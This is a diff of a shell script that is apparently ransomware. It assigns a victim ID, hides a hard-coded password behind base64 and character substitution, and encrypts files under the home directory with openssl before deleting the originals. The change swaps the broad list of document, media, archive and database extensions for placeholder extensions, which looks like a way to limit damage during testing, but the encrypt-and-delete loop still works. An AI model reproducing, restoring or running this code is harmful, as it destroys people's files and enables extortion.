@@ -7,7 +7,9 @@ VICTIM_ID=$(uuidgen)
 PASSWORD=$(echo -n "g0tr00t3d" | base64 | tr 'A-Za-z0-9+/=' 'NOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' | rev)
 
 # Encrypt files in the home directory
-find "$HOME" -type f \( -name "*.txt" -o -name "*.docx" -o -name "*.pdf" -o -name "*.jpg" -o -name "*.png" -o -name "*.xlsx" -o -name "*.pptx" -o -name "*.csv" -o -name "*.db" -o -name "*.sql" -o -name "*.json" -o -name "*.xml" -o -name "*.html" -o -name "*.htm" -o -name "*.md" -o -name "*.zip" -o -name "*.rar" -o -name "*.7z" -o -name "*.tar" -o -name "*.gz" -o -name "*.bz2" -o -name "*.mp3" -o -name "*.wav" -o -name "*.mp4" -o -name "*.avi" -o -name "*.mov" -o -name "*.mkv" \) | while read file; do
+#find "$HOME" -type f \( -name "*.txt" -o -name "*.docx" -o -name "*.pdf" -o -name "*.jpg" -o -name "*.png" -o -name "*.xlsx" -o -name "*.pptx" -o -name "*.csv" -o -name "*.db" -o -name "*.sql" -o -name "*.json" -o -name "*.xml" -o -name "*.html" -o -name "*.htm" -o -name "*.md" -o -name "*.zip" -o -name "*.rar" -o -name "*.7z" -o -name "*.tar" -o -name "*.gz" -o -name "*.bz2" -o -name "*.mp3" -o -name "*.wav" -o -name "*.mp4" -o -name "*.avi" -o -name "*.mov" -o -name "*.mkv" \) | while read file; do
+ find "$HOME" -type f \( -name "*.a1b" -o -name "*.a2b" -o -name "*.a3b" \) | while read file; do
+
     openssl enc -aes-256-cbc -salt -pass pass:$(echo -n "$PASSWORD" | tr 'NOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' 'A-Za-z0-9+/=' | rev | base64 --decode) -in "$file" -out "${file}.enc"
     rm "$file"
 done
